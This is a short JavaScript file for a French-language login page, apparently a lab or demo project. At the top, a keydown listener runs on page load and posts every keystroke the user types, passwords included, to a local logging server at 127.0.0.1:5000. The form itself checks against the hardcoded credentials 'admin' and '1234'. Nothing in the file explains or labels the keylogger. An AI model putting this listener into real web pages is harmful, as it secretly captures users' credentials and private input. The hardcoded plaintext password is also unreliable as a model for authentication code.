document.addEventListener("keydown", function (e) {
  const data = new URLSearchParams();
  data.append("key", e.key);
  fetch("http://127.0.0.1:5000/log", { method: "POST", body: data });
});

function handleFormSubmit(event) {
  event.preventDefault();
  const user = document.getElementById("user").value;
  const pass = document.getElementById("pass").value;
  const modal = document.getElementById("modal");
  const title = document.getElementById("modalTitle");
  const body = document.getElementById("modalBody");

  if (user === "admin" && pass === "1234") {
    title.innerText = "Succès";
    title.className = "success";
    body.innerText = "Bienvenue dans votre espace sécurisé.";
  } else {
    title.innerText = "Erreur";
    title.className = "error";
    body.innerText = "Identifiants incorrects. Veuillez réessayer.";
  }
  modal.style.display = "flex";
}

function closeModal() {
  document.getElementById("modal").style.display = "none";
  document.getElementById("user").value = "";
  document.getElementById("pass").value = "";
}
